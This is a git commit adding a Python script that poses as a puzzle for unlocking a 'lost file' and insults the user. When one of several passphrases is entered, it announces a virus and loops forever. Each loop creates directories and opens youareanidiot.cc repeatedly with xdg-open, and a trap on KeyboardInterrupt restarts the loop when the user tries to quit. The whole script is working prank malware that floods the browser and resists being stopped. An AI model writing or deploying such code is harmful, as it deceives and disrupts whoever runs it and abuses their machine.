a7f7a7b05939b4e7e967ea8d168efc84163df172
destroyerLinuxPropaly <160316312+destroyerLinuxPropaly@users.noreply.github.com>
2024-04-22 21:43:14 +0700

    Add files via upload

---
+++ tryv2.py
@@ -0,0 +1,100 @@
+#DONT ASK ME PLEASE
+#DO NOT RECORDER AND SETTINGS
+import sys
+import os
+import time
+import webbrowser
+import urllib
+m = "\033[1;91m"
+h = "\033[1;92m"
+p = "\033[1,97m"
+m3= "\033[41;97m"
+df= "\x1b[1;37m\033[0m"
+py = "max(py - movespeed, 5)"
+def j(s):
+    for c in s + "\n":
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(0.008)
+def mask():
+   print(f"""{m3}
+
+			       If you leave you are weak and stupid
+
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠛⠛⠟⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⢀⠀⠠⢀⠀⢂⠁⡈⠐⡀⠠⢀⠀⠄⢈⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⡀⢂⠐⡈⠠⢈⠐⠀⠈⠀⠀⠀⢀⠀⠐⡀⢈⠐⡀⢂⡐⢀⠀⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡁⠄⢂⠡⠐⡀⠂⠄⠁⡀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⢂⠐⡠⢈⠔⡀⢂⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⡿⢋⡐⠤⡉⢄⠂⠡⢀⠁⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠂⠠⠐⠠⣈⠐⡌⠰⡈⠹⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⠃⣄⠸⠠⡘⢀⡘⠠⠀⠀⠄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢀⠀⠃⡀⠄⡘⢃⠄⢣⠸⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⠃⡜⢠⢃⠱⡐⠠⢀⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠁⠀⡈⠀⡐⢈⠰⡁⢎⡐⢆⡹⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⡇⢎⡰⢃⠌⡂⡁⠂⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠈⠤⠑⢢⠑⣢⠐⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⡏⢦⠑⡊⡔⠡⡀⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠤⠉⢆⡓⢤⢋⣼⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⡟⢦⡙⠰⡈⠔⡀⢂⠄⡂⣄⣤⣰⣤⣤⣢⣄⠠⢄⡐⠠⠐⡠⢠⣄⣦⣄⣦⣤⣐⡈⢄⡁⢂⠌⢡⠒⡌⢆⡣⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⢢⠅⢣⡉⢦⡱⣎⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⢢⢌⡱⣉⢶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣕⠪⡔⣡⠘⣬⢱⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣎⢇⢢⡝⡲⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢆⡱⠌⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⣔⢣⠂⢧⣾⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⡌⢢⡓⡱⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠜⡀⠆⡱⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠳⡌⢧⡉⢶⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣇⢣⡱⢁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠠⠈⠄⠡⠚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⡌⢣⢌⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⢦⠱⡈⠆⢻⣿⣿⣿⣿⣿⣿⣿⡿⠋⡀⢃⠀⠈⠐⠡⢈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠃⡐⢈⠧⣸⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣇⢣⡑⡌⢂⡉⠛⡛⠛⠛⠋⠁⢀⠐⠠⢀⣤⣶⣄⠁⠂⠄⠀⡉⠛⠛⠛⠛⠋⢀⠠⢈⠢⠜⣽⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢧⡑⢎⡑⢢⠅⢢⡀⠄⠂⠌⡐⢠⣾⣿⣿⣿⣶⡀⠐⠤⢁⠂⡔⡀⢆⠰⡈⡄⢎⡰⢲⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⡷⣯⢧⣛⢦⡱⢌⡘⠄⡌⢹⠻⡛⣙⠻⡛⢅⠊⡔⢢⡑⢦⡹⣬⣳⣵⣻⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣓⢮⡐⢣⠘⡄⠣⠐⡁⠂⢅⠊⡜⢰⢃⡎⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣜⢦⡝⢦⡓⣌⠲⡡⣌⠱⡌⠲⣌⠧⣞⡼⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⡍⠓⡯⠓⢹⡬⠗⠵⣎⠷⠩⣗⠎⠛⡞⢡⠓⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠃⡆⠀⠀⠆⠀⠀⠆⠀⠀⢂⠀⠀⡇⢢⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⡠⠉⠒⠅⠂⠐⠓⠀⠒⣁⠊⢀⢣⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡽⣹⠖⡞⢦⠤⡤⠧⢤⠤⡖⢶⠺⣍⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣟⣬⢃⢧⠣⡝⣢⠝⣬⣣⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+			⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{m3}
+
+""")
+
+def main():
+
+  while True:
+      try:
+        os.system("clear")
+        mask()
+        a = input(f"""		         {m3}Enter the code.txt before entering the lost file
+					  DEATH TIME KEY : 
+				   """)
+        if a == "the world be were destroy" or a == 'i will die and into the darkness' or a == "NO MORE WE LIFE IN THE WORLD":
+          time.sleep(3)
+          j(f"\n           Good job you managed to find and open the lost file, and this file is....")
+          time.sleep(2)
+          while True:
+             print("                A VIRUS YOU ARE AN IDIOT HAHA, YOU VERY VERY IDIOT IDIOT")
+             os.system("mkdir youareanidiot.org")
+             os.system("mkdir YouAreStupid")
+             os.system("mkdir YouIdiotIn game $HOME")
+             os.system("xdg-open https://youareanidiot.cc/")
+             os.system("xdg-open https://youareanidiot.cc/")
+             os.system("xdg-open https://youareanidiot.cc/")
+             time.sleep(0.1)
+        elif a == "my god is Allah":
+             print(f"\n                                     I'm going to a dark place")
+             time.sleep(1)
+             sys.exit()
+        else:
+           time.sleep(5)
+           print("""				    
+					  Wrong input idiot!""")
+           time.sleep(1)
+      except Exception as e:
+           raise(e)
+
+try:
+ main()
+except KeyboardInterrupt:
+ while True:
+       main()
+       try:
+             main()
+       except KeyboardInterrupt:
+             main()
+except Exception as e:
+ raise(e)
